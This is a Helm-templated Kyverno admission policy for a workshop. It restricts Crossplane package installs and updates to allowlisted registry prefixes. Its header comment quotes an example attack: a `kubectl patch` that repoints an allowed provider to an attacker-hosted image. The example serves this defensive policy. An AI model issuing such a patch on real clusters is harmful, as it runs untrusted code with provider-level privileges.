{{/*
Block participants from installing Crossplane packages from sources
outside the workshop's allowlist. Covers Provider, Function, and
Configuration kinds — all three are pulled as OCI images and run
with provider-class RBAC, so a foreign package is a code-execution
primitive (#115).

Why an allowlist on `spec.package` (not on `metadata.name`):
- A `kubectl patch provider provider-helm --type=merge -p
  '{"spec":{"package":"docker.io/attacker/x:latest"}}'` keeps the
  allowed name but repoints the image. The previous `metadata.name`
  allowlist let that through.
- Function and Configuration kinds are uncovered today — adding them
  here closes module-06-freestyle-style abuse where a participant
  installs an arbitrary OCI Function.

Allowed package-string prefixes (current workshop content needs all
four):
- xpkg.upbound.io/crossplane-contrib/  (provider-helm, function-auto-ready, function-go-templating)
- xpkg.crossplane.io/crossplane-contrib/  (function-patch-and-transform, provider-upjet-github)
- xpkg.upbound.io/upbound/  (provider-aws-*, provider-gcp-*, provider-azure-* — module 06)
- ghcr.io/riccap/  (provider-arubacloud)

Plus, when `.Values.registry.host` is set, the pair's own prefix
`<host>/<pairId>/`. Crossplane 101 has each pair `crossplane project
push` a Configuration and install it; without this the install is
denied at admission and the module cannot complete.

Deliberately scoped to the pair's own path rather than the registry
as a whole: reads are anonymous, but a pair installing another
pair's package would still be running someone else's code with
provider-class RBAC, which is the thing this policy exists to stop.
With `registry.host` empty the alternation is unchanged, so this is
a no-op until the registry is built.
*/}}
{{/* Four backslashes, not two: Go's string literal collapses them to
     two, and the double-quoted YAML scalar below collapses those to
     the single backslash the regex needs. */}}
{{- $prefixes := list
      "xpkg\\\\.upbound\\\\.io/crossplane-contrib/"
      "xpkg\\\\.crossplane\\\\.io/crossplane-contrib/"
      "xpkg\\\\.upbound\\\\.io/upbound/"
      "ghcr\\\\.io/riccap/" -}}
{{- $allowedList := "xpkg.upbound.io/crossplane-contrib/, xpkg.crossplane.io/crossplane-contrib/, xpkg.upbound.io/upbound/, ghcr.io/riccap/" -}}
{{- if and .Values.registry.host .Values.pairId -}}
{{- $ownPrefix := printf "%s/%s/" .Values.registry.host .Values.pairId -}}
{{- $prefixes = append $prefixes (printf "%s/%s/" (.Values.registry.host | replace "." "\\\\.") .Values.pairId) -}}
{{- $allowedList = printf "%s, %s (your own packages)" $allowedList $ownPrefix -}}
{{- end -}}
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-rogue-providers
  annotations:
    argocd.argoproj.io/sync-wave: "2"
    policies.kyverno.io/category: Workshop / Aruba
    policies.kyverno.io/severity: medium
    policies.kyverno.io/description: |
      Crossplane Provider / Function / Configuration packages must
      be sourced from the workshop's allowlisted registries. Catches
      both new installs (CREATE) and `spec.package` repoints (UPDATE).
spec:
  validationFailureAction: Enforce
  background: false
  rules:
    - name: package-prefix-allowlist
      match:
        any:
          - resources:
              kinds:
                - pkg.crossplane.io/v1/Provider
                - pkg.crossplane.io/v1/Function
                - pkg.crossplane.io/v1/Configuration
              operations:
                - CREATE
                - UPDATE
      validate:
        message: >-
          Crossplane package source not in the workshop allowlist.
          Allowed prefixes: {{ $allowedList }}.
        deny:
          conditions:
            all:
              - key: "{{`{{ regex_match('^(`}}{{ join "|" $prefixes }}{{`).+', request.object.spec.package) }}`}}"
                operator: Equals
                value: false
